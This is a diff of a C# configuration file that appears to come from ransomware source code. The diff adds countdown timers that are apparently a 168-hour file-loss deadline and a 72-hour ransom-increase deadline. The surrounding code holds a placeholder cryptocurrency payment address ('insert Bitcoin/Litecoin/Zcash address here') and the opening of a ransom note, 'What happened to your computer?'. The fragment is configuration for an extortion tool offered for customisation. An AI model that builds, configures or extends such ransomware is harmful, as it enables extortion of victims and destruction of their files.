@@ -6,11 +6,21 @@
             System.Reflection.Assembly.GetExecutingAssembly().Location);
 
         // Debugging configuration
-        public bool sandBox = false; // Safemode for testing/debugging
+        public bool sandBox = true; // Safemode for testing/debugging
         public string sandBoxDirectory = currentWorkingDirectory + @"\sandboxedDirectory";
-        public bool debugMode = true; // Debug mode will enable/disable display of the Debug Console/GUI
-        
+        public bool debugMode = false; // Debug mode will enable/disable display of the Debug Console/GUI
+
         // GUI Application configuration
+        
+        /* Timer application */
+        // 168:00:00
+        // 0xA8:0x00:0x00
+        public int lostTimer_Hours = 0xA8; public int lostTimer_Minutes = 0x0; public int lostTimer_Seconds = 0x0;
+
+        // 72:00:00
+        // 0x48:0x00:0x00
+        public int riseTimer_Hours = 0x48; public int riseTimer_Minutes = 0x0; public int riseTimer_Seconds = 0x0;
+
         public string cryptoAddress = "1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2"; // insert Bitcoin/Litecoin/Zcash address here
         public string customDisplayMessage =
 @"What happened to your computer?
